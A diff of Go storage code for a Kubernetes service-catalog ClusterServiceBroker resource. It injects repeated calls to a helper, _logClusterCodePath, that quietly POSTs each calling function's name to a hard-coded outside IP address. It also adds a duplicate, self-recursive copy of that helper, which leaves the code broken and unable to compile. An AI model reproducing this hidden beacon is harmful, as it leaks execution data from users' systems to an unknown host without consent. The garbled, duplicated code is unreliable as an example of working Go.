@@ -29,9 +29,13 @@ var (
 func NewSingular(ns, name string) runtime.Object {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &servicecatalog.ClusterServiceBroker{TypeMeta: metav1.TypeMeta{Kind: "ClusterServiceBroker"}, ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name}}
 }
 func EmptyObject() runtime.Object {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return &servicecatalog.ClusterServiceBroker{}
@@ -39,9 +43,13 @@ func EmptyObject() runtime.Object {
 func NewList() runtime.Object {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &servicecatalog.ClusterServiceBrokerList{TypeMeta: metav1.TypeMeta{Kind: "ClusterServiceBrokerList"}, Items: []servicecatalog.ClusterServiceBroker{}}
 }
 func CheckObject(obj runtime.Object) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_, ok := obj.(*servicecatalog.ClusterServiceBroker)
@@ -53,14 +61,20 @@ func CheckObject(obj runtime.Object) error {
 func Match(label labels.Selector, field fields.Selector) storage.SelectionPredicate {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return storage.SelectionPredicate{Label: label, Field: field, GetAttrs: GetAttrs}
 }
 func toSelectableFields(broker *servicecatalog.ClusterServiceBroker) fields.Set {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return generic.ObjectMetaFieldsSet(&broker.ObjectMeta, false)
 }
 func GetAttrs(obj runtime.Object) (labels.Set, fields.Set, bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	broker, ok := obj.(*servicecatalog.ClusterServiceBroker)
@@ -70,6 +84,8 @@ func GetAttrs(obj runtime.Object) (labels.Set, fields.Set, bool, error) {
 	return labels.Set(broker.ObjectMeta.Labels), toSelectableFields(broker), broker.Initializers != nil, nil
 }
 func NewStorage(opts server.Options) (clusterServiceBrokers, clusterServiceBrokerStatus rest.Storage) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	prefix := "/" + opts.ResourcePrefix()
@@ -111,9 +127,13 @@ var (
 func (r *StatusREST) New() runtime.Object {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &servicecatalog.ClusterServiceBroker{}
 }
 func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return r.store.Get(ctx, name, options)
@@ -121,12 +141,23 @@ func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOp
 func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, forceAllowCreate, options)
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
